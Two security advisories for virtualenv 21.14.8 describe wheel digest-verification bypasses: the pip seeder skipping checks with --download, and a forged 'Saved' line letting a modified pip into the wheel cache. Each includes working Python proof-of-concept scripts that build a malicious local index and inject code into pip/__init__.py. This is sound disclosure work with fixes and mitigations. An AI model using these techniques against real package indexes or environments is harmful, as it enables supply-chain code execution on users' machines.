body.description: ## Summary The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected. Index candidates on that path do not pass through virtualenv's wheel digest verification. Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Wheel selection by the pip seeder when downloads are enabled. ## Attacker-controlled input The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy. Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset with open(f"{work}/pip.conf", "w") as pip_conf: pip_conf.write(f"[global]\nindex-url = file://{work}/mirror\n") # file:// stands in for the mirror's http URL os.makedirs(f"{work}/home-default") os.makedirs(f"{work}/home-pip") # one HOME per run, so neither sees the other's app-data or pip cache virtualenv = [sys.executable, f"{companions}/virtualenv_offline.py", f"{work}/pypi.org", "--no-periodic-update"] # control: the default seeder with --download fetches the mirror's wheel and refuses it default_seeder = subprocess.run( [*virtualenv, "--download", f"{work}/env-default"], env={**os.environ, "HOME": f"{work}/home-default", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith("RuntimeError: ")] print(f"\nCONTROL virtualenv --download env-default: exit {default_seeder.returncode}") print("\n".join(refusal)) # trigger: the same command plus --seeder pip pip_seeder = subprocess.run( [*virtualenv, "--download", "--seeder", "pip", f"{work}/env-pip"], env={**os.environ, "HOME": f"{work}/home-pip", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) print(f"\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}") print(pip_seeder.stdout) if pip_seeder.returncode == 0: env_pip = subprocess.run([f"{work}/env-pip/bin/pip", "--version"], capture_output=True, text=True, check=True) print(f"$ env-pip/bin/pip --version\n{env_pip.stdout}") # check: compare env-pip's pip/__init__.py with the one in each wheel with zipfile.ZipFile(bundled.path) as wheel: bundled_init = wheel.read("pip/__init__.py") with zipfile.ZipFile(mirror_wheel) as wheel: mirror_init = wheel.read("pip/__init__.py") installed = glob.glob(f"{work}/env-pip/lib/python*/site-packages/pip/__init__.py") installed_init = open(installed[0], "rb").read() if installed else b"" refusal_message = f"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}" refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout print(f"default seeder refused the mirror's wheel for its digest: {refused}") print(f"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}") print(f"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}") print("BUG" if refused and installed_init == mirror_init and os.path.exists(marker) else "OK") ``` **`repro.d/make_mirror.py`** ```text #!/usr/bin/env python3 # usage: make_mirror.py import os import sys import zipfile genuine_wheel, mirror, marker = sys.argv[1:] wheel_name = os.path.basename(genuine_wheel) payload = f"\nopen({marker!r}, 'w').write('mirror code ran')\n" os.makedirs(f"{mirror}/pip") with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f"{mirror}/pip/{wheel_name}", "w") as served: for entry in genuine.infolist(): data = genuine.read(entry) if entry.filename == "pip/__init__.py": data += payload.encode() served.writestr(entry, data) # PEP 503 project page; pip reads /pip/index.html for a file:// index with open(f"{mirror}/pip/index.html", "w") as page: page.write(f'{wheel_name}\n') ``` **`repro.d/virtualenv_offline.py`** ```text #!/usr/bin/env python3 # usage: virtualenv_offline.py # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched. import sys from virtualenv.__main__ import run_with_catch from virtualenv.seed.wheels import periodic_update pypi_org = sys.argv[1] def pypi_json_api(url, context=None): return open(url.replace("https://pypi.org", pypi_org), "rb") periodic_update.urlopen = pypi_json_api run_with_catch(sys.argv[2:]) ``` ## Impact The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by itself defeat TLS or establish control of an index response. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix acquires wheels through the shared verification path and installs pinned names with index lookup disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze output. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives separately. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.

body.description: ## Summary Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual output. A verification failure does not remove the downloaded file from that cache. Anthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Download selection and promotion into the reusable wheel cache. ## Attacker-controlled input A download must fail verification, or the archive selected from pip output must differ from the file later reused. Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI comparison. ## Affected code The relevant 21.14.8 source is in [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py). ## Mechanism `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain there. Later wheel selection does not hash the cached file again. ## Reproduction and evidence The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case it served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent environment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a forged `Saved ` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded the modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant. The report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`, leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The gap follows the digest check added in #3251, first released in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual archive, and promotes it only after acceptance. ## Attack sequence ```mermaid sequenceDiagram participant I as Configured index participant P as pip download participant C as wheel/house cache participant V as virtualenv digest check participant N as New environment I->>P: modified wheel and forged Saved line P->>C: write modified wheel directly P-->>V: stdout names genuine bundled wheel V->>V: hash genuine wheel and accept V->>C: record modified wheel for reuse C->>N: seed modified pip without rehash Note over P,C: Even a rejected wheel can remain in the cache ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import atexit import hashlib import json import os import shutil import subprocess import sys from pathlib import Path companions = Path("/tmp/repro.d") work = Path("/tmp/forged-saved-line") home = work / "home" app_data = home / ".cache" / "virtualenv" this_python = f"{sys.version_info.major}.{sys.version_info.minor}" # the target; each Python has its own update log update_log_of_pip = app_data / "wheel" / this_python / "embed" / "3" / "pip.json" virtualenv = [sys.executable, companions / "virtualenv_with_local_pypi_json.py", work / "pypi"] as_user = {"cwd": home, "env": {"HOME": str(home), "PATH": os.environ["PATH"]}, "capture_output": True, "text": True} added_code_prints = "code added by the index" # the line index_serves_modified_pip.py adds to pip/__init__.py def user_upgrades_seed_wheels_and_creates_env(): # each case starts from an empty app-data shutil.rmtree(app_data, ignore_errors=True) shutil.rmtree(home / "env", ignore_errors=True) upgrade = subprocess.run([*virtualenv, "--upgrade-embed-wheels"], **as_user) # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach subprocess.run([*virtualenv, "--no-periodic-update", "env"], **as_user, check=True) pip_version = subprocess.run([home / "env" / "bin" / "python", "-m", "pip", "--version"], **as_user, check=True) # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0 refusal = next((line for line in upgrade.stderr.splitlines() if "but PyPI reports" in line), None) logged = [] if update_log_of_pip.exists(): # a failed update writes no log logged = [entry["filename"] for entry in json.loads(update_log_of_pip.read_text())["versions"]] return refusal, logged, pip_version.stdout.splitlines() # set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it shutil.rmtree(work, ignore_errors=True) (home / ".config" / "pip").mkdir(parents=True) shutil.copy(companions / "pip.conf", home / ".config" / "pip" / "pip.conf") subprocess.run([sys.executable, companions / "pypi_json_and_mirror.py", work / "pypi", work / "index"], check=True) index_server = subprocess.Popen( [sys.executable, "-u", "-m", "http.server", "8099", "--bind", "127.0.0.1", "--directory", work / "index"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, ) atexit.register(index_server.kill) assert index_server.stdout.readline().startswith("Serving HTTP"), "index server did not start" # printed once bound # control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it subprocess.run([sys.executable, companions / "index_serves_modified_pip.py", work / "index"], check=True) refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env() print("CONTROL modified pip: --upgrade-embed-wheels refused with:", refusal) print("CONTROL modified pip: update log of pip lists", logged) print("CONTROL modified pip: pip --version in the new env prints", pip_says) control_ran_added_code = added_code_prints in "\n".join(pip_says) # attack: the index also adds one link, whose data-requires-python puts a "Saved " line into pip's output subprocess.run([sys.executable, companions / "index_forges_saved_line.py", work / "index"], check=True) refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env() stored_wheel = app_data / "wheel" / "house" / "pip-26.0.1-py3-none-any.whl" stored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest() pypi_sha256 = json.loads((work / "pypi" / "pip.json").read_text())["releases"]["26.0.1"][0]["digests"]["sha256"] print("OBSERVED + forged line: --upgrade-embed-wheels refused with:", refusal) print("OBSERVED + forged line: update log of pip lists", logged) print("OBSERVED + forged line: sha256 of that wheel in wheel/house:", stored_sha256) print("OBSERVED + forged line: sha256 PyPI publishes for that name:", pypi_sha256) print("OBSERVED + forged line: pip --version in the new env prints", pip_says) attack_ran_added_code = added_code_prints in "\n".join(pip_says) # check: the same modified wheel, refused without the forged line, is seeded with it print("BUG" if attack_ran_added_code and not control_ran_added_code else "OK") ``` **`repro.d/index_forges_saved_line.py`** ```text """Attacker, as the operator of the index the user's pip.conf names: make pip print a "Saved " line of its choice. usage: index_forges_saved_line.py Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1. """ import shutil import sys from pathlib import Path # a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9, # at the same path for every user of this image GENUINE_WHEEL_ON_USERS_DISK = "/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl" index_dir = Path(sys.argv[1]) # named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with # "Discarding (requires-python:): ... has inconsistent version" on stdout shutil.copy(index_dir / "files" / "pip-26.2.1-py3-none-any.whl", index_dir / "files" / "pip-100.0-py3-none-any.whl") # pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; is a line feed with (index_dir / "simple" / "pip" / "index.html").open("a") as page: page.write( 'pip-100.0-py3-none-any.whl\n' ) ``` **`repro.d/index_serves_modified_pip.py`** ```text """Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name. usage: index_serves_modified_pip.py pip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own, virtualenv's comparison with PyPI's SHA-256 catches this. """ import hashlib import io import sys import zipfile from pathlib import Path ADDED_CODE = b'\nprint("code added by the index runs as uid", __import__("os").getuid())\n' index_dir = Path(sys.argv[1]) wheel = index_dir / "files" / "pip-26.0.1-py3-none-any.whl" genuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes())) with zipfile.ZipFile(wheel, "w") as modified: for entry in genuine.infolist(): content = genuine.read(entry) if entry.filename == "pip/__init__.py": content += ADDED_CODE modified.writestr(entry, content) # the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's # download folder first, and pip replaces a file of the same name there only when the link's digest differs sha256 = hashlib.sha256(wheel.read_bytes()).hexdigest() (index_dir / "simple" / "pip" / "index.html").write_text( f'\n{wheel.name}\n' ) ``` **`repro.d/pip.conf`** ```text [global] index-url = http://127.0.0.1:8099/simple ``` **`repro.d/pypi_json_and_mirror.py`** ```text """Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully. usage: pypi_json_and_mirror.py The wheels bundled with virtualenv are genuine PyPI files. /.json is what https://pypi.org/pypi//json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table. is a PEP 503 tree (simple//index.html, files/) that offers exactly these files. """ import json import shutil import sys import zipfile from email.parser import HeaderParser from html import escape from pathlib import Path from virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256 pypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2]) pypi_dir.mkdir() (index_dir / "files").mkdir(parents=True) for project in ("pip", "setuptools"): releases, links = {}, [] for filename, sha256 in BUNDLE_SHA256.items(): name, version = filename.split("-")[:2] if name != project: continue shutil.copy(BUNDLE_FOLDER / filename, index_dir / "files") releases[version] = [{"filename": filename, "digests": {"sha256": sha256}, "upload_time": "2026-01-01T00:00:00"}] with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel: metadata = HeaderParser().parsestr(wheel.read(f"{name}-{version}.dist-info/METADATA").decode()) requires_python = escape(metadata["Requires-Python"]) links.append(f'{filename}') (pypi_dir / f"{project}.json").write_text(json.dumps({"releases": releases})) (index_dir / "simple" / project).mkdir(parents=True) (index_dir / "simple" / project / "index.html").write_text("\n" + "\n".join(links) + "\n") ``` **`repro.d/virtualenv_with_local_pypi_json.py`** ```text """Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network. usage: virtualenv_with_local_pypi_json.py Only the request for https://pypi.org/pypi//json is replaced: it is answered from /.json. pip, the index pip talks to and the rest of virtualenv are the real thing. """ import sys from pathlib import Path from unittest import mock from virtualenv.__main__ import run_with_catch pypi_dir = Path(sys.argv[1]) def pypi_json_api(url, context): assert url.startswith("https://pypi.org/pypi/") and context is None, url project = url.split("/")[4] return (pypi_dir / f"{project}.json").open("rb") with mock.patch("virtualenv.seed.wheels.periodic_update.urlopen", pypi_json_api): run_with_catch(sys.argv[2:]) ``` ## Impact A file rejected during download verification can remain available for later cache selection. Exploitation requires additional control over the downloaded data or archive selection; this finding alone does not bypass TLS. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix downloads into a private temporary directory and verifies archive identity, requested version, digest where applicable, and Python compatibility before promoting a wheel into the reusable cache. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation After a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing unexpected download failures. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.
